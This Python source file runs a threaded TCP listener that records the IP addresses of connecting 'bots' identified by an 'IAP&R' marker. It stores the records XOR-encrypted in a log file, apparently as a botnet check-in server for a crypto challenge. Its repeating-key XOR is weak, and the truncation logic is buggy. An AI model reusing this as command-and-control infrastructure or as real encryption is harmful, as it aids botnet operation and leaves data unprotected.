import socket
import threading

from cryptkblib import MyRandomGenerator
from cryptkblib import MyLogFile

from config import *


def encrypt_data(secret_key, data):

    ciphered = b""
    length = len(data)

    if (length > chunk_size):
        print(f"Too large data chunk ({length}) : truncated")
        data = data[:chunk_size]

    for i in range(length):
        ciphered += int.to_bytes(data[i] ^ secret_key[i%length], 1)

    return ciphered



def handle_client(client_socket, client_address, secret_key, log_file):
    try:
        data = client_socket.recv(1024).decode('utf-8')
        if "IAP&R" in data:
            to_log = f"{client_address[0]}:{data}\n".encode("utf-8")
            log_file.write(encrypt_data(secret_key, to_log), "data")

            print(f"New bot IP: {client_address[0]}")
        else:
            print(f"Oops")
    except:
        client_socket.close()


def start_server():

    lf = MyLogFile(filename, header_size, chunk_size, magic_bytes, eof)
    
    rd = MyRandomGenerator()

    secret_key = rd.getrandombytes(chunk_size)

    hex_secret_key = ''.join(f'{i:02X}' for i in secret_key)

    print(f"Here is your secret key, please keep it safe :\n0x{hex_secret_key}\n")

    lf.create()

    lf.write(encrypt_data(secret_key, metadata1), "meta")
    lf.write(encrypt_data(secret_key, metadata2), "meta")
    lf.write(encrypt_data(secret_key, metadata3), "meta")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"Server listening on {HOST}:{PORT}")

    try:

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Accepted connection from {client_address}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address, secret_key, lf))
            client_handler.start()

    except:

        lf.save()


if __name__ == "__main__":
    start_server()
